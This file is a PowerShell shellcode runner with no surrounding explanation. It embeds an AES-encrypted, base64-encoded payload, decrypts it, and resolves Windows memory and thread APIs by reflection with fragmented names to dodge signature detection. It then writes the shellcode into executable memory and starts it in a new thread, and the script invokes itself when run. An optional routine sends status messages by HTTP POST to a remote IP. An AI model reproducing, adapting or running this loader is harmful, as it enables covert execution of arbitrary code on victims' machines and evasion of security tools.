<#
.SYNOPSIS
    Copy shellcode into memory and execute it.
.DESCRIPTION
    Copy shellcode into memory and execute it.
.PARAMETER RemoteDebugIP
    The IP address to connect to for remote debugging.
.PARAMETER RemoteDebugPort
    The port to connect to for remote debugging.
#>

#------[Declarations]------#
param(
    [Parameter(Mandatory=$false)]
    [String]$RemoteDebugIP = '',
    [Parameter(Mandatory=$false)]
    [Int]$RemoteDebugPort = 8080
)

$Debug = $true

#------[Functions]------#
function Send-Debug($Message) {
    if ($Debug) {
        Write-Host $Message
    }
    
    # If remote debug IP is specified, send debug message to remote IP using HTTP POST request
    if ($RemoteDebugIP) {
        $url = "http://$($RemoteDebugIP):$($RemoteDebugPort)"
        $body = @{message=$Message} | ConvertTo-Json
        Invoke-WebRequest -Uri $url -Method POST -Body $body | Out-Null
    }
}

function GetAddress($m, $f) {
    $sA = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split("\\")[-1] -eq "Sy" + "ste" + "m.dll"}

    $uNM = ForEach ($t in $sA.GetTypes()) {
        $t | Where-Object {$_.FullName -like "*Nati" + "veM" + "ethods" -and $_.Fullname -like "*Win32*" -and $_.Fullname -like "*Un*"}
    }

    $mH = $uNM.GetMethods() | Where-Object {$_.Name -like "*Handle" -and $_.Name -like "*Module*"} | Select-Object -First 1
    $pA = $uNM.GetMethod("Ge" + "tPro" + "cAdd" + "ress", [type[]]("IntPtr", "System.String"))

    $m = $mH.Invoke($null, @($m))
    $pA.Invoke($null, @($m, $f))
}

function GetType($f, $dT = [Void]) {
    $t = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", 
    [System.MulticastDelegate])

    $t.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $f).SetImplementationFlags("Runtime, Managed")
    $t.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $dT, $f).SetImplementationFlags("Runtime, Managed")

    return $t.CreateType()
}

function IsElevated() {
    $wI = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $wP = New-Object System.Security.Principal.WindowsPrincipal($wI)
    $wP.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-Arch {
    if ([IntPtr]::Size -eq 4) {
        return "x86"
    } elseif ([IntPtr]::Size -eq 8) {
        return "x64"
    } else {
        return $null
    }
}

function Invoke-SRunner {
    # Get architecture
    $Arch = Get-Arch
    if ($Debug) {
        if ($Arch -eq $null) {
            Send-Debug "[!] Unable to determine architecture of the current process"
            return
        } else {
            Send-Debug "[*] You are running this script in a $Arch process"
        }
    }
    

    # Check if running as admin
    if ($Debug) {
        if (IsElevated) {
            Send-Debug "[*] You are running this script as an administrator"
        } else {
            Send-Debug "[!] You are not running this script as an administrator"
        }
    }

    # Win32 API functions
    $vA = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("kerne" + "l32.dll") ("Vir" + "tualAl" + "loc")), (GetType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    

    # buf to hold shellcode
    $Key = [System.Convert]::FromBase64String("64MDEvy+7ysO9PX8JkMr4IBhRLy53JOMm6WHWiFh5co=")
    $IV = [System.Convert]::FromBase64String("2M9RzBbr3G/mdfZygLQ3lg==")
    $EncryptedBytes = [System.Convert]::FromBase64String("lXHWu15diOXkahW5ZzavM+PhF0pwJdtbMAVSFP+yHDDLtTY44t+GmOQSUYZp8lcN7zCbN59C0841CXIAPHj1jZZOHGajoYs5toC1ZhxGsa+bwr7XaAvAnA4XS8jEHpOevVfp0Ui8gV5bHhzfuI+8eFAyltHip4bhO9UqvLoDHTcvTQMa1vSEkrAefampruXhtmBP8GyP/sVo9vztTGMeGQOjm/jZQhw8UXbb/uwJcz1hpSPk0xbM1DTvMzOxAMNwQLigRxpzsXqt8IL3T5m3S9Ecje983/5JPwFHPEiTLU/ncmSz95P1NM9OSt6TPlMuVk5x612jWB8TO131YOch7SK/lDDQkm96M+W8+QlxdymWFT78P9o2T6RNPB1e/RWZ")

    $AesManaged = New-Object Security.Cryptography.AesManaged
    $AesManaged.Key = $Key
    $AesManaged.IV = $IV
    $AesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
    $AesManaged.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    $Decryptor = $AesManaged.CreateDecryptor($AesManaged.Key, $AesManaged.IV)

    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        
    [Byte[]] $buf = $DecryptedBytes

    # allocate memory
    $aM = $vA.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)

    if ($Debug) {
        if ($aM -eq 0) {
            Send-Debug "[!] Failed to allocate memory"
            return
        } else {
            Send-Debug "[+] Allocated memory at 0x$($aM.ToString("X"))"
        }
    }

    # get handle to current process
    $cP = [System.Diagnostics.Process]::GetCurrentProcess()
    $rPH = $cP.Handle

    # copy shellcode to memory
    $wPM = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("ker" + "nel3" + "2.dll") ("Writ" + "eProc" + "essMem" + "ory")), (GetType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
    $wPM.Invoke($rPH, $aM, $buf, $buf.Length, 0) | Out-Null

    if ($Debug) {
        if ($wA -eq 0) {
            Send-Debug "[!] Failed to write shellcode to memory"
            return
        } else {
            Send-Debug "[+] Copied shellcode to memory"
        }
    }

    # change memory protection to RX
    $vP = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("kerne" + "l3" + "2.dll") ("Vir" + "tualPr" + "otect")), (GetType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))
    $p = 0
    $vP.Invoke($aM, [uint32]$buf.Length, 0x40, [Ref] $p) | Out-Null

    if ($Debug) {
        if ($p -eq 0) {
            Send-Debug "[!] Failed to change memory protection to RX"
            return
        } else {
            Send-Debug "[+] Changed memory protection to RX"
        }
    }

    # create thread
    $cT = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("kerne" + "l32.dll") ("Cre" + "ateThr" + "ead")), (GetType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
    $tH = $cT.Invoke(0, 0, $aM, 0, 0, 0)

    if ($Debug) {
        if ($tH -eq 0) {
            Send-Debug "[!] Failed to create thread"
            return
        } else {
            Send-Debug "[+] Created thread"
        }
    }

    # wait for thread to finish
    $wSO = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("kerne" + "l32.dll") ("Wai" + "tForSing" + "leObject")), (GetType  @([IntPtr], [Int32]) ([UInt32])))
    $wSO.Invoke($tH, -1) | Out-Null
}

#------[Execution]------#
Invoke-SRunner